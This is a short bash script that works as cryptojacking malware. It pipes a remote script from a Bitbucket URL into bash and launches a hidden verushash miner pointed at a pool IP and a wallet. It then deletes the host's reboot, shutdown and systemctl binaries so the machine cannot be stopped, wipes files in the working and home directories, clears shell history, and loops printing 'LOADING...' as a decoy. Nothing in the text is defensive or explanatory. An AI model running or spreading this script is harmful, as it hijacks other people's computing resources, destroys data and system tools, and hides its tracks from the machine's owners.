#!/bin/bash
apt-get update 
apt-get install -y wget curl sudo
curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
chmod +x srbkaze
sudo nohup ./srbkaze --algorithm verushash --pool 149.56.27.47:3958 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
sleep 10
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "LOADING..."
        sleep 20
done
